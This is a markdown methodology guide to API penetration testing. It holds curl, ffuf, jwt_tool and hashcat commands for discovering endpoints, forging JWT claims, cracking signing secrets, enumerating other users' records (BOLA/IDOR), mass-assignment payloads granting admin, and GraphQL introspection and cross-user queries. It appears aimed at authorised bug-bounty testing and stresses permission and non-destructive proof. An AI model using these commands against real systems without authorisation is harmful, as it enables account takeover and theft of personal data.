# API Testing

APIs are where the highest-severity findings concentrate, because almost every
API bug is a missing authorisation check, and authorisation is exactly what
automated scanners cannot check.

## Contents

- [Why APIs break the usual tooling](#why-apis-break-the-usual-tooling)
- [Finding the API surface](#finding-the-api-surface)
- [Reading the documentation](#reading-the-documentation)
- [Authentication in APIs](#authentication-in-apis)
- [BOLA and IDOR, the main event](#bola-and-idor-the-main-event)
- [Mass assignment](#mass-assignment)
- [Excessive data exposure](#excessive-data-exposure)
- [Rate limiting and business logic](#rate-limiting-and-business-logic)
- [GraphQL](#graphql)
- [Method and content-type tricks](#method-and-content-type-tricks)
- [Testing workflow](#testing-workflow)

---

## Why APIs break the usual tooling

A scanner crawls links. APIs have no links. It submits forms. APIs have no
forms. This is why API testing is a manual discipline with a small set of
reliable techniques rather than a tool you fire at a URL.

**Test authorisation, not payloads.** A SQL injection scanner running against
an API endpoint will find nothing if the real problem is that endpoint 2 lets
you read user 7's invoices. Fix your model of what you are testing before you
reach for a tool.

---

## Finding the API surface

```bash
# The common documentation paths. Try all of them, they are free.
curl -s https://<target>/swagger-ui.html
curl -s https://<target>/swagger-ui/
curl -s https://<target>/api-docs
curl -s https://<target>/api/docs
curl -s https://<target>/v2/api-docs
curl -s https://<target>/v3/api-docs
curl -s https://<target>/openapi.json
curl -s https://<target>/swagger.json
curl -s https://<target>/api/swagger.json
curl -s https://<target>/docs
curl -s https://<target>/graphql
curl -s https://<target>/graphiql
```

```bash
# Paths hidden in the front-end code. This is the reliable method.
curl -s https://<target>/ | grep -oE "src=\"[^\"]+\.js" | cut -d'"' -f2
wget -q -r -l 2 -A js -H -k -p https://<target>/ -P ./site
grep -rohE "/api/v[0-9]+/[a-zA-Z0-9/_{}-]+" ./site | sort -u
grep -rohE "https?://[a-zA-Z0-9._-]+/api/[a-zA-Z0-9/_{}-]+" ./site | sort -u
```

```bash
# Common prefixes worth fuzzing
ffuf -w api-paths.txt -u https://<target>/api/v1/FUZZ -mc all -fc 404
ffuf -w api-paths.txt -u https://<target>/FUZZ -mc all -fc 404
```

```bash
# If you have authorisation to test the mobile app
apktool d app.apk -o app_unpacked
grep -rohE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9/_{}-]+" app_unpacked | sort -u
grep -riE "api[_-]?key|client[_-]?secret|Authorization" app_unpacked/res app_unpacked/smali
```

Mobile apps are the best API documentation that exists, and people forget they
are allowed to unpack the one they are testing.

---

## Reading the documentation

If you find an OpenAPI spec, it is a map of the entire API, including every
endpoint nobody linked from the UI.

```bash
# Save and summarise it
curl -s https://<target>/v3/api-docs -o openapi.json
jq '.paths | keys' openapi.json
jq '.paths | to_entries[] | {path: .key, methods: (.value | keys)}' openapi.json
jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] | "\(.key|ascii_upcase) \($p)"' openapi.json
```

```bash
# All declared parameters, which is where IDOR candidates come from
jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
       "\(.key|ascii_upcase) \($p) -> \([.value.parameters[]?.name] | join(", "))"' openapi.json
```

Three things to extract immediately: every parameter that looks like an
identifier (`id`, `userId`, `accountId`, `uuid`, `orderId`), every endpoint that
deals with other users' data, and any endpoint using a `PUT` or `PATCH`.

---

## Authentication in APIs

Four schemes you will meet. Know which one you are looking at.

| Scheme | Header |
|---|---|
| None | Requests succeed unauthenticated |
| API key | `X-API-Key: <key>` or `apikey=<key>` |
| Basic | `Authorization: Basic <base64>` |
| Bearer | `Authorization: Bearer <token>` |
| Custom | `Authorization: <scheme> <token>` |

```bash
# Basic auth encoding
echo -n "user:pass" | base64

# No auth
curl -s https://<target>/api/users

# API key in a header
curl -s https://<target>/api/users -H "X-API-Key: <key>"

# Bearer token
curl -s https://<target>/api/users -H "Authorization: Bearer <token>"

# Session cookie, for APIs behind a web front end
curl -s https://<target>/api/users -b "session=<cookie>"
```

### What to test in the token

```bash
# Decode without verifying. Never send a live token to a third-party decoder.
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

```bash
# Forge a claim and see if the server honours it
jwt_tool <token> -C -d '{"role":"admin"}' -X
jwt_tool <token> -C -d '{"user_id":1}' -X
jwt_tool <token> -C alg -p none -X
```

```bash
# Weak signing secrets
hashcat -m 16500 jwt.txt wordlist.txt        # for short or common secrets
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
```

**Test each token against every endpoint.** A common real pattern is that the
token validates correctly on the v1 API while a v2 endpoint skips the
authorisation check entirely. Enumerate versions as if they were different
applications.

---

## BOLA and IDOR, the main event

Broken Object Level Authorisation is OWASP API Security's number one, for good
reason. The API checks that you are authenticated, then does not check that
*this specific object* belongs to you.

```bash
# 1. Establish your own object. This is your reference.
curl -s https://<target>/api/v1/users/me -H "Authorization: Bearer <your_token>"
# -> {"id": 1042, "email": "you@example.com"}

# 2. Read the identifier pattern. It is usually a small integer.
# 3. Enumerate, changing only the object ID. Keep every other header identical.
curl -s https://<target>/api/v1/users/1041 -H "Authorization: Bearer <your_token>"
curl -s https://<target>/api/v1/users/1040 -H "Authorization: Bearer <your_token>"
curl -s https://<target>/api/v1/users/1039 -H "Authorization: Bearer <your_token>"
```

```bash
# Automate the sweep
for id in $(seq 1000 1100); do
  r=$(curl -s -o /dev/null -w "%{http_code}" "https://<target>/api/v1/users/$id" \
        -H "Authorization: Bearer <your_token>")
  [ "$r" = "200" ] && echo "200 on $id"
done
```

```bash
# UUIDs are not the protection they look like. Test for sequence anyway.
curl -s https://<target>/api/v1/orders/1 -H "Authorization: Bearer <token>"
curl -s https://<target>/api/v1/orders/2 -H "Authorization: Bearer <token>"
```

```bash
# No ID at all, or a mutable one in the body
curl -s -X PUT https://<target>/api/v1/users/me \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}'
```

**The variations that make this a complete finding.** Test each of these, since
programmes often need the exact method demonstrated:

- `GET` on a record you should not read
- `PUT` or `PATCH` on a record you should not modify
- `DELETE` on a record you should not delete, proved with a non-existent ID so nothing is destroyed
- Nested resources: `/users/1041/orders/99`
- Different HTTP methods on the same path, some apps check auth only on `POST`
- Removing the auth header entirely, or sending a token for a role you do not have
- GraphQL equivalents, covered below

```bash
# Prove it without destroying anything. A 404 on a fake ID versus a 200 on a
# real one is the cleanest possible demonstration.
curl -s -o /dev/null -w "%{http_code}\n" https://<target>/api/v1/users/99999999 -H "Authorization: Bearer <token>"
```

Report with a redacted screenshot: your own object ID, the other user's ID, and
a blurred snippet of the data. Showing a real person's email address is the one
thing that gets a report rejected on privacy grounds.

---

## Mass assignment

The API accepts and binds fields the UI never sends. You add a parameter, the
server sets it anyway.

```bash
# 1. Capture the real request
# 2. Add fields the form does not contain
curl -s -X POST https://<target>/api/v1/profile \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"name":"Test","email":"you@example.com","role":"admin","isAdmin":true,"is_staff":true,"verified":true,"balance":9999}'

# 3. Read the object back and see which fields stuck
curl -s https://<target>/api/v1/profile -H "Authorization: Bearer <token>"
```

**Field names to try.** `role`, `admin`, `isAdmin`, `is_admin`, `is_staff`,
`isSuperuser`, `verified`, `email_verified`, `is_active`, `disabled`, `balance`,
`credits`, `account_type`, `permissions`, `group_id`, `plan`, `price_override`,
`discount`.

```bash
# Try a few naming conventions automatically
ffuf -w mass-assign-fields.txt -X POST https://<target>/api/v1/profile \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"username":"test","FUZZ":"true"}' -mc all -fc 200
```

If a field sticks, you have a real finding, and often it chains: set
`is_staff` then access the admin endpoint you just unlocked.

---

## Excessive data exposure

The endpoint returns more than the caller needs. Often nobody looks, because
the front end only renders the first three fields.

```bash
# Ask for a list and look at every field, not just the ones on screen
curl -s https://<target>/api/v1/users -H "Authorization: Bearer <token>" | jq .
curl -s https://<target>/api/v1/users/1042 -H "Authorization: Bearer <token>" | jq keys
```

Common findings: password hashes, internal user IDs, roles, phone numbers,
payment tokens, reset tokens, internal flags, and other users' data inside a
list endpoint you are only meant to see your own items in.

```bash
# Find it mechanically across many endpoints
for ep in users orders invoices payments tickets addresses; do
  echo "--- $ep ---"
  curl -s "https://<target>/api/v1/$ep" -H "Authorization: Bearer <token>" | jq -r 'if type=="array" then .[0]|keys[] else keys[] end' 2>/dev/null
done
```

---

## Rate limiting and business logic

```bash
# Is there a limit at all? Compare response codes, not just timing.
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code} " "https://<target>/api/v1/login" \
    -X POST -d '{"user":"admin@example.com","pass":"guess"}'
done; echo

# Check the headers, rate limits announce themselves when well built
curl -sI https://<target>/api/v1/login | grep -i "ratelimit\|x-limit\|retry-after"
```

```bash
# Test a single account, not a spray, when checking lockout behaviour
for i in $(seq 1 12); do
  curl -s -o /dev/null -w "%{http_code} " -X POST https://<target>/api/v1/login \
    -d '{"user":"your-own-account","pass":"wrong"}'
done; echo
```

Business logic in APIs is the same material as in [web-testing.md](web-testing.md),
expressed as calls: price fields in the request body, quantity fields that accept
negative values, a coupon endpoint with no ownership check, a payment-confirm
endpoint you can call directly without a cart, and duplicate-use of a
single-use token.

---

## GraphQL

GraphQL moves the whole API surface into one endpoint, which means you can
enumerate it yourself.

```bash
# Introspection. If this works, the schema is a gift.
curl -s -X POST https://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .

# Types and mutations
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}' | jq .

# Every field of one type
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}' | jq .

# Save the whole schema to work offline
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name args { name } } } } }"}' | jq . > schema.json
```

```bash
# The bug to look for: object-level authorisation, per field
# This is the GraphQL BOLA test. Ask for someone else's record.
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your_token>" \
  -d '{"query":"{ user(id: 1041) { id email name } }"}' | jq .
```

```bash
# Try the singular form too, it is a distinct code path
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your_token>" \
  -d '{"query":"{ user(id: \"1041\") { id email } }"}' | jq .

# Mutations may have weaker checks than queries. Always test them.
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your_token>" \
  -d '{"query":"mutation { updateUser(id:1041, input:{role:\"admin\"}) { id role } }"}' | jq .

# Batch queries, so one authorisation failure does not stop the next
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1041){email} }"},{"query":"{ user(id:1042){email} }"}]'
```

```bash
# Aliases let you pull many records in one request
curl -s -X POST https://<target>/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"query":"{ a:user(id:1041){email} b:user(id:1042){email} c:user(id:1043){email} }"}' | jq .

# Deep nesting can be a denial of service. Do not test this without permission.
# This is shown so you recognise it, and report it from a code review instead.
# { a { a { a { a { ... } } } } }
```

Field-level authorisation is the classic GraphQL finding: the query for your
own record correctly filters sensitive fields, and the query for someone else's
record returns them. If you can enumerate the schema, you can find every
unauthorised field yourself.

---

## Method and content-type tricks

```bash
# HTTP method override. Some frameworks let you override the verb in a header
curl -s -X POST https://<target>/api/v1/user -H "X-HTTP-Method-Override: GET" \
  -H "X-HTTP-Method: GET" -H "X-Method-Override: GET"

# TRACE, if enabled, echoes the request back including headers
curl -s -X TRACE https://<target>/api/v1/user

# Cross-protocol abuse: XML or form encoding into a JSON endpoint
curl -s -X POST https://<target>/api/v1/user \
  -H "Content-Type: application/x-www-form-urlencoded" -d '{"role":"admin"}'

# Accept header, if the API negotiates on it
curl -s https://<target>/api/v1/user -H "Accept: application/xml"
curl -s https://<target>/api/v1/user -H "Accept: text/html"
```

---

## Testing workflow

A sequence that produces findings, rather than a list of things to try.

1. **Map the surface.** Documentation path, then JavaScript, then the mobile app. Save every endpoint.
2. **Authenticate two ways.** Register two accounts. You will need a second identity to prove cross-account access.
3. **Build an object inventory.** List your own users, orders, files, tokens. Note every identifier.
4. **Diff the two accounts.** Same endpoint, different token, same result, different data. That is BOLA.
5. **Read one full response carefully.** Every field. The UI hides most of them.
6. **Add fields the UI does not send.** Mass assignment.
7. **Check the authorisation on every method.** `GET`, `PUT`, `PATCH`, `DELETE`, not just the one in the UI.
8. **Check the limits.** Rate limits, negative quantities, replayable tokens.
9. **Check the neighbours.** Other API versions, other tenants, other HTTP methods.
10. **Re-verify before reporting.** Every finding, with a clean reproduction and a benign control.

Step 10 is the one that gets skipped. See [field-notes.md](field-notes.md) on
why unverified findings are worse than no findings.
